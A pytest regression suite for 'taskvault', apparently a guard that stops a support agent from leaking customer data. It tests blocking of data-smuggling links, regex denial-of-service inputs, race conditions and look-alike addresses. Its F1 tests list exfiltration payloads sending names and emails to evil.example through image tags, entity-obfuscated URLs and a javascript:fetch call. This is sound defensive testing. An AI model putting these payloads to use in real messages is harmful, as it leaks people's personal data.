# Copyright 2026 AgentP-Codes
# SPDX-License-Identifier: AGPL-3.0-only
"""Regression tests for the findings fixed in 0.5.1 (a private report on 0.5.0). Simulated data only."""

import base64
import copy
import io
import json
import re
import threading
import time

import pytest
import yaml

from demo.__main__ import POLICY, make_vault
from demo.world import World
from taskvault import detect
from taskvault.attacks import lint
from taskvault.mcp import ProxyServer
from taskvault.policy import Policy
from taskvault.vault import LOOSE_TOKEN_RE, Blocked, Vault, _glob, _matches, _norm_pattern, _urls

from .test_api import api, call  # noqa: F401 - the local API fixture

RAW = yaml.safe_load(open(POLICY))
CARD = "4111 1111 1111 1111"


def make(pseudo=True, delay=0.0, **top):
    raw = copy.deepcopy(RAW)
    if pseudo:
        raw["sources"]["crm.customer"]["pseudonymize"] = ["name", "email"]
    raw.update(top)
    world = World()
    get = world.get_customer
    if delay:
        def get(key, _get=world.get_customer):
            time.sleep(delay)
            return _get(key)
    vault = Vault(Policy.from_dict(raw), {"crm.customer": get, "docs": world.get_doc, "inbox.ticket": world.get_ticket},
                  {"email.send": world.send_email, "payments.refund": world.refund})
    return vault, world


def customer(**kw):
    vault, world = make(**kw)
    task = vault.start_task("support_reply", customer_id=12)
    return task, task.read("crm.customer"), world


# ------------------------------------------------------------------ F1: customer data inside outside links
@pytest.mark.parametrize("pseudo", [True, False])
@pytest.mark.parametrize("body", [
    '<img src="https://evil.example/p.gif?n={name}&e={email}">',
    "[your account](https://evil.example/a?who={email})",
    "Details: https://evil.example/t/{email}",
    "<https://evil.example/?e={email}>",
    "<div style=\"background:url('https://evil.example/{email}')\"></div>",
    '<img src="//evil.example/x?{email}">',
    '<a href="https://acme.example@evil.example/?{email}">x</a>',          # the host is evil.example
    '<a href="https://evil.example\\@acme.example/?{email}">x</a>',        # browsers read \\ as /
    '<img src="h&#116;tps://evil.example/?{email}">',                       # HTML entities
    "evil.example/collect?{email}",                                          # no scheme: mail apps link it
    # found by the review of the first fix:
    "[x](https:evil.example?e={email})",                                     # no slashes, no '/' at all
    '<a href="https:evil.example?e={email}">x</a>',
    "https:evil.example?e={email}",
    '<a href="https://evil.example/?a=\'x\'&e={email}&n={name}">x</a>',   # a quote inside the link
    "<a href='https://evil.example/?a=\"x\"&n={name}'>x</a>",
    '<a href="\x01https://evil.example/?n={name}">x</a>',                  # browsers drop leading controls
    '<meta http-equiv="refresh" content="0;url=https://evil.example/?n={name}">',
    '<img srcset="a.png 1x, https://evil.example/?n={name} 2x">',
    "HTTPS://EVIL.EXAMPLE/?n={email}",
    "https:///evil.example/?n={email}",
    "https://evil.example:443/?n={email}",
    "https://1.2.3.4/?n={email}", "1.2.3.4/?n={email}",
    '<a href="javascript:fetch(\'//evil.example/\'+\'{email}\')">x</a>',
])
def test_customer_data_in_a_link_to_an_outside_site_is_blocked(pseudo, body):
    task, c, world = customer(pseudo=pseudo)
    with pytest.raises(Blocked, match="link"):
        task.act("email.send", to=c["email"], subject="hi", body=body.format(**c))
    assert world.outbox == []


@pytest.mark.parametrize("encode", [
    lambda v: v.replace("@", "%40"),
    lambda v: v.replace(" ", "+"),
    lambda v: v.replace(".", "%252E"),                  # encoded twice
    lambda v: v.replace(" ", ""),                       # squeezed
    lambda v: "".join(f"&#{ord(ch)};" for ch in v),     # every letter as an HTML entity
])
def test_encoded_customer_data_in_links_is_found(encode):
    task, c, world = customer(pseudo=False)
    for value in (c["email"], c["name"]):
        with pytest.raises(Blocked, match="link"):
            task.act("email.send", to=c["email"], subject="hi",
                     body=f'<a href="https://evil.example/?q={encode(value)}">x</a>')
    assert world.outbox == []


@pytest.mark.parametrize("body", [
    "Hi {name}, your refund is on its way. See https://help.example.org/refunds for details.",
    "Here's https://help.example.org/refunds for you, {name}'s account is fine.",
    'He said "see https://help.example.org/x" and {name} agreed.',
    "https://help.example.org/refunds\nThanks, {name}",
    '<p>Dear {name},</p><p><a href="https://help.example.org/refunds">Refund policy</a></p>',
    "Contact us: mailto:support@acme.example or reply to {email}.",
    "[Refunds](https://help.example.org/refunds) - {name}",
])
def test_outside_links_without_customer_data_still_work(body):
    task, c, world = customer(pseudo=False)
    assert task.act("email.send", to=c["email"], subject="hi", body=body.format(**c)) == "sent"


def test_shadow_mode_records_links_without_blocking():
    raw = copy.deepcopy(RAW)
    world = World()
    vault = Vault(Policy.from_dict(raw), {"crm.customer": world.get_customer, "docs": world.get_doc,
                                          "inbox.ticket": world.get_ticket},
                  {"email.send": world.send_email, "payments.refund": world.refund}, mode="shadow")
    task = vault.start_task("support_reply", customer_id=12)
    c = task.read("crm.customer")
    task.act("email.send", to=c["email"], subject="hi", body=f"https://evil.example/?e={c['email']}")
    assert any("link" in e.get("reason", "") for e in vault.audit.decisions("would_block"))
    assert world.outbox  # shadow mode: the action still ran


@pytest.mark.parametrize("body", [
    "Hi {name}, see https://en.wikipedia.org/wiki/Shah",                     # one common word of a value
    "Hi {name}, parking: https://www.example.org/king-street",
])
def test_one_common_word_in_a_link_is_not_customer_data(body):
    task, c, world = customer(pseudo=False)
    assert task.act("email.send", to=c["email"], subject="hi", body=body.format(**c)) == "sent"


def test_two_words_of_a_value_in_a_link_are_blocked():
    task, c, world = customer(pseudo=False)
    with pytest.raises(Blocked, match="link"):
        task.act("email.send", to=c["email"], subject="hi", body="https://evil.example/?first=Priya&last=Shah")


@pytest.mark.parametrize("seed", range(5))
def test_a_card_next_to_other_numbers_is_hidden_whole(seed):
    rng = __import__("random").Random(seed)
    for _ in range(400):
        while True:
            card = "4" + "".join(str(rng.randint(0, 9)) for _ in range(15))
            if detect.luhn_ok(card):
                break
        shown = rng.choice([" ", "-"]).join(card[i:i + 4] for i in range(0, 16, 4))
        text = " ".join([*(str(rng.randint(0, 999)) for _ in range(rng.randint(0, 3))), shown,
                         *(str(rng.randint(0, 999)) for _ in range(rng.randint(0, 4)))])
        start = text.index(shown)
        assert any(k == "card_number" and s <= start and e >= start + len(shown)
                   for k, s, e in detect.scan_text(text)), text


def _wide(text):
    """ASCII digits as full-width digits."""
    return text.translate({ord(d): 0xFF10 + int(d) for d in "0123456789"})


@pytest.mark.parametrize("text", [_wide("id 01234567890123"), "\u0664\u0661\u0661\u0661 " * 4,
                                  "\u6ce8\u6587 " + _wide("2026092912345678")])
def test_other_digit_scripts_do_not_crash_the_scanner(text):
    detect.scan_text(text)
    detect.redact_secrets(text)


def test_full_width_card_is_hidden():
    out = detect.redact_secrets("card " + _wide(CARD))
    assert "removed by taskvault" in out and _wide("4") not in out


@pytest.mark.parametrize("day", range(1, 29))
def test_a_card_followed_by_a_date_is_hidden_whole(day):
    for month in range(1, 13):
        text = f"Paid with 4111 1111 1111 1111 2025-{month:02d}-{day:02d} $42.00"
        assert detect.redact_secrets(text).startswith("Paid with [card_number removed by taskvault] 2025-"), text


def test_flag_handlers_run_outside_the_task_lock():
    raw = copy.deepcopy(RAW)
    raw["tasks"]["support_reply"]["budget"] = {"reads": 1}
    world = World()
    seen = []

    def use_task():
        try:
            task.read("docs", "refund_policy")
        except Blocked:
            pass                                        # over budget too; what matters is it didn't wait
        seen.append(True)

    def on_flag(event):
        if seen or getattr(on_flag, "busy", False):
            return
        on_flag.busy = True
        other = threading.Thread(target=use_task)
        other.start()
        other.join(5)
        assert not other.is_alive()

    vault = Vault(Policy.from_dict(raw), {"crm.customer": world.get_customer, "docs": world.get_doc,
                                          "inbox.ticket": world.get_ticket},
                  {"email.send": world.send_email, "payments.refund": world.refund}, on_flag=on_flag)
    task = vault.start_task("support_reply", customer_id=12)
    task.read("crm.customer")
    with pytest.raises(Blocked):
        task.read("crm.customer")
    assert seen                                         # the handler could use the task without waiting


def test_approval_waits_outside_the_task_lock():
    raw = copy.deepcopy(RAW)
    raw["tasks"]["support_reply"]["sinks"]["email.send"]["approval"] = "always"
    world = World()
    waiting, answer = threading.Event(), threading.Event()

    def approver(req):
        waiting.set()
        return answer.wait(5)

    vault = Vault(Policy.from_dict(raw), {"crm.customer": world.get_customer, "docs": world.get_doc,
                                          "inbox.ticket": world.get_ticket},
                  {"email.send": world.send_email, "payments.refund": world.refund}, approver=approver)
    task = vault.start_task("support_reply", customer_id=12)
    c = task.read("crm.customer")
    t = threading.Thread(target=lambda: task.act("email.send", to=c["email"], subject="s", body="b"))
    t.start()
    assert waiting.wait(5)
    start = time.perf_counter()
    task.read("docs", "refund_policy")                   # not held up by the person deciding
    assert time.perf_counter() - start < 1
    answer.set()
    t.join()
    assert len(world.outbox) == 1


def test_a_refused_approval_does_not_use_up_the_limit():
    raw = copy.deepcopy(RAW)
    raw["tasks"]["support_reply"]["sinks"]["email.send"]["approval"] = "always"
    world = World()
    answers = iter([False, False, False, True, True, True, True])
    vault = Vault(Policy.from_dict(raw), {"crm.customer": world.get_customer, "docs": world.get_doc,
                                          "inbox.ticket": world.get_ticket},
                  {"email.send": world.send_email, "payments.refund": world.refund},
                  approver=lambda req: next(answers))
    task = vault.start_task("support_reply", customer_id=12)
    c = task.read("crm.customer")
    for _ in range(3):
        with pytest.raises(Blocked):
            task.act("email.send", to=c["email"], subject="s", body="b")
    for _ in range(3):
        task.act("email.send", to=c["email"], subject="s", body="b")
    with pytest.raises(Blocked, match="more than 3"):
        task.act("email.send", to=c["email"], subject="s", body="b")
    assert len(world.outbox) == 3


def test_placeholders_in_outside_links_are_blocked():
    task, c, world = customer(pseudo=False)
    with pytest.raises(Blocked):
        task.act("email.send", to=c["email"], subject="hi", body=f"https://evil.example/?c={c['card_number']}")
    assert world.outbox == []


def test_ordinary_links_and_company_links_still_work():
    task, c, world = customer()
    body = (f"Hi {c['name']}, see https://help.example.org/refunds and "
            f'<a href="https://acme.example/account?e={c["email"]}">your account</a> or '
            f"https://billing.acme.example/{c['name']}.")
    assert task.act("email.send", to=c["email"], subject="hi", body=body) == "sent"
    sent = world.outbox[-1]["body"]
    assert "https://acme.example/account?e=priya.shah@example.com" in sent and "Hi Priya Shah" in sent


def test_link_domains_allow_a_named_outside_site():
    vault, world = make(link_domains=["*.bookings.example"])
    task = vault.start_task("support_reply", customer_id=12)
    c = task.read("crm.customer")
    task.act("email.send", to=c["email"], subject="hi", body=f"https://eu.bookings.example/new?name={c['name']}")
    assert "name=Priya Shah" in world.outbox[-1]["body"]
    with pytest.raises(Blocked):
        task.act("email.send", to=c["email"], subject="hi", body=f"https://evilbookings.example/?n={c['name']}")


def test_finding_links_stays_fast_on_hostile_text():
    for text in ["a." * 150_000 + "/", ("a" * 63 + ".") * 5000 + "/", "<//" + "a" * 300_000,
                 "\"//" + "a" * 300_000, "](/" * 100_000, "&#" * 150_000 + "/", "www." * 75_000]:
        start = time.perf_counter()
        _urls(text)
        assert time.perf_counter() - start < 2, text[:20]


# ------------------------------------------------------------------ F2: slow regular expressions
HOSTILE = ["a." * 100_000, "a" * 200_000, "1 " * 100_000, "1-" * 100_000, "+1 " * 70_000, "a@" * 100_000,
           "a.a@" * 50_000, "a@a." * 50_000, "[[vault:" * 25_000, "[[ vault :" * 20_000, "123-456 " * 25_000,
           "123456," * 30_000, "AB12 " * 40_000, "-" * 200_000, "1." * 100_000, "١" * 200_000]


@pytest.mark.parametrize("text", HOSTILE, ids=range(len(HOSTILE)))
def test_detection_runs_in_linear_time(text):
    start = time.perf_counter()
    detect.scan_text(text)
    detect.redact_secrets(text)
    LOOSE_TOKEN_RE.findall(text)
    assert time.perf_counter() - start < 10          # typically under 1.5 s; the slow patterns took minutes


def test_a_huge_hostile_ticket_does_not_stall_the_vault():
    task, c, world = customer()
    start = time.perf_counter()
    with pytest.raises(Blocked):     # anything, as long as it answers quickly
        task.act("email.send", to=c["email"], subject="hi", body="a." * 400_000 + " https://evil.example/" + c["name"])
    assert time.perf_counter() - start < 10


# ------------------------------------------------------------------ F3: limits under parallel calls
def test_call_limits_hold_under_parallel_calls():
    vault, world = make(delay=0.01)
    task = vault.start_task("support_reply", customer_id=12)
    c = task.read("crm.customer")
    gate = threading.Barrier(30)

    def send():
        gate.wait()
        try:
            task.act("email.send", to=c["email"], subject="s", body="b")
        except Blocked:
            pass

    threads = [threading.Thread(target=send) for _ in range(30)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert len(world.outbox) == 3


def test_data_budget_holds_under_parallel_reads():
    raw = copy.deepcopy(RAW)
    raw["tasks"]["support_reply"]["budget"] = {"reads": 5}
    world = World()

    def slow(key):
        time.sleep(0.01)
        return world.get_customer(key)

    vault = Vault(Policy.from_dict(raw), {"crm.customer": slow, "docs": world.get_doc,
                                          "inbox.ticket": world.get_ticket},
                  {"email.send": world.send_email, "payments.refund": world.refund})
    task = vault.start_task("support_reply", customer_id=12)
    ok = []
    gate = threading.Barrier(20)

    def read():
        gate.wait()
        try:
            task.read("crm.customer")
            ok.append(1)
        except Blocked:
            pass

    threads = [threading.Thread(target=read) for _ in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert len(ok) == 5


def test_a_slow_sink_does_not_hold_other_tasks_or_the_count():
    vault, world = make(pseudo=False)
    started = threading.Event()
    release = threading.Event()

    def slow_send(to, subject, body):
        started.set()
        release.wait(5)
        return "sent"

    vault.sinks["email.send"] = slow_send
    task = vault.start_task("support_reply", customer_id=12)
    c = task.read("crm.customer")
    t = threading.Thread(target=lambda: task.act("email.send", to=c["email"], subject="s", body="b"))
    t.start()
    assert started.wait(5)
    assert task.read("docs", "refund_policy")          # the task isn't locked while its sink runs
    release.set()
    t.join()


# ------------------------------------------------------------------ F4: secrets echoed back in other forms
@pytest.mark.parametrize("echo", [
    "4111—1111—1111—1111", "4111·1111·1111·1111", "4111 - 1111 - 1111 - 1111",
    base64.b64encode(b"4111111111111111").decode(), base64.b64encode(CARD.encode()).decode(),
    base64.urlsafe_b64encode(b"4111111111111111").decode().rstrip("="), b"4111111111111111".hex(),
    b"4111111111111111".hex().upper(),
])
def test_echoed_secrets_are_masked_in_other_forms(echo):
    task, c, world = customer(pseudo=False)
    task.vault.sinks["payments.refund"] = lambda card, amount: {"note": f"refunded {echo}"}
    out = json.dumps(task.act("payments.refund", card=c["card_number"], amount=5))
    assert echo not in out and "[[vault:card_number:" in out


# ------------------------------------------------------------------ F5: recipient patterns
@pytest.mark.parametrize("pattern,recipient,ok", [
    ("*@acme.example", "priya.shah@acme.example", True),
    ("*@acme.example", "x@evil.acme.example", False),
    ("*@*.acme.example", "x@eu.acme.example", True),
    ("*@*.acme.example", "x@a.b.acme.example", False),
    ("*acme.example", "evil@notacme.example", False),
    ("*acme.example", "x@acme.example", False),
    ("https://*.partner.com/*", "https://api.partner.com/in", True),
    ("https://*.partner.com/*", "https://evil.com/x.partner.com/y", False),
    ("https://*.partner.com/*", "https://api.partner.com/a/b", False),
    ("https://files.acme.example/upload/**", "https://files.acme.example/upload/a/b", True),
    ("https://files.acme.example/upload/Team", "https://files.acme.example/upload/team", False),
    ("https://files.acme.example/upload/Team", "HTTPS://FILES.acme.example/upload/Team", True),
    ("+614*", "+61400111222", True),
    ("C0[AB]*", "C0A123", True),
    ("x[!a]y@acme.example", "x.y@acme.example", True),
    ("x[/]y", "x/y", False),                          # a class never matches the part's separators
    ("[^a]@acme.example", "^@acme.example", True),    # '^' is literal, as in fnmatch
    ("c0support1", "C0SUPPORT1", False),              # ids other than email addresses keep their case
])
def test_recipient_patterns_match_only_what_they_say(pattern, recipient, ok):
    assert _matches(recipient, [_norm_pattern(pattern)]) is ok


def test_glob_is_compiled_once_and_anchored():
    rx = _glob("*@acme.example")
    assert rx is _glob("*@acme.example") and rx.fullmatch("a@acme.example.evil") is None


@pytest.mark.parametrize("pattern,warn", [
    ("*acme.example", True), ("*@*acme.example", True), ("https://*partner.com/*", True), ("*@*", True),
    ("*@com", True), ("https://*.com", True), ("https://*partner.com", True), ("http://*.co.uk", False),
    ("*@acme.example", False), ("*@*.acme.example", False), ("https://*.partner.com/*", False),
    ("crm.customer:{customer_id}.email", False), ("support@acme.example", False), ("+614*", False),
    ("C0SUPPORT*", False),
])
def test_lint_warns_about_loose_recipient_patterns(pattern, warn):
    raw = copy.deepcopy(RAW)
    raw["tasks"]["support_reply"]["sinks"]["email.send"]["allowed_recipients"] = [pattern]
    warnings = [w for w in lint(Policy.from_dict(raw)) if "email.send" in w and "recipient" in w]
    assert bool(warnings) is warn


# ------------------------------------------------------------------ F6: unusual input
def _serve(*lines):
    world = World()
    server = ProxyServer(make_vault(world), "support_reply", {"customer_id": 12})
    out = io.StringIO()
    init = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}
    ping = {"jsonrpc": "2.0", "id": 99, "method": "ping"}
    server.serve(io.StringIO("\n".join([json.dumps(init), *lines, json.dumps(ping)]) + "\n"), out)
    return [json.loads(x) for x in out.getvalue().splitlines()], world


@pytest.mark.parametrize("line", [
    '{"jsonrpc": "2.0", "id": 5, "method": "ping", "x": ' + "9" * 5000 + "}",
    '{"jsonrpc": "2.0", "id": 6, "method": "tools/call", "params": {"name": "refund", "arguments": '
    '{"card": "x", "amount": ' + "9" * 5000 + "}}}",
])
def test_proxy_survives_numbers_too_long_to_read(line):
    replies, world = _serve(line)
    assert replies[-1] == {"jsonrpc": "2.0", "id": 99, "result": {}} and world.refunds == []


def test_deeply_nested_arguments_are_blocked_not_crashed():
    task, c, world = customer(pseudo=False)
    deep = "x"
    for _ in range(5000):
        deep = [deep]
    with pytest.raises(Blocked, match="nested"):
        task.act("email.send", to=c["email"], subject="s", body=deep)
    with pytest.raises(Blocked, match="too long"):
        task.act("email.send", to=c["email"], subject="s", body=10 ** 5000)
    assert world.outbox == []


def test_api_refuses_numbers_too_long_to_read(api):  # noqa: F811
    assert call(api, "POST", "/v1/tasks", raw='{"template": "support_reply", "n": ' + "9" * 5000 + "}")[0] == 400
    assert call(api, "GET", "/v1/health")[0] == 200


# ------------------------------------------------------------------ F7: internationalised owner addresses
def test_an_owner_address_with_non_ascii_letters_can_be_emailed():
    vault, world = make(pseudo=False)
    world.customers[12]["email"] = "josé@example.com"
    task = vault.start_task("support_reply", customer_id=12)
    c = task.read("crm.customer")
    assert task.act("email.send", to=c["email"], subject="s", body="hi") == "sent"
    assert world.outbox[-1]["to"] == "josé@example.com"


@pytest.mark.parametrize("to", [
    "josé@example.com",          # same look, different (decomposed) form
    "josé@examplе.com",      # Cyrillic e in the domain
    "josé@example.com​",     # invisible character
    "x@example.com, josé@example.com",
])
def test_look_alikes_of_a_non_ascii_owner_are_blocked(to):
    vault, world = make(pseudo=False)
    world.customers[12]["email"] = "josé@example.com"
    task = vault.start_task("support_reply", customer_id=12)
    task.read("crm.customer")
    with pytest.raises(Blocked):
        task.act("email.send", to=to, subject="s", body="hi")
    assert world.outbox == []


def test_non_ascii_addresses_never_match_a_wildcard():
    assert not _matches("josé@acme.example", [_norm_pattern("*@acme.example")])
    assert _matches("josé@acme.example", ["josé@acme.example"])
    assert not re.search("[^\\x00-\\x7f]", _norm_pattern("*@ACME.example"))
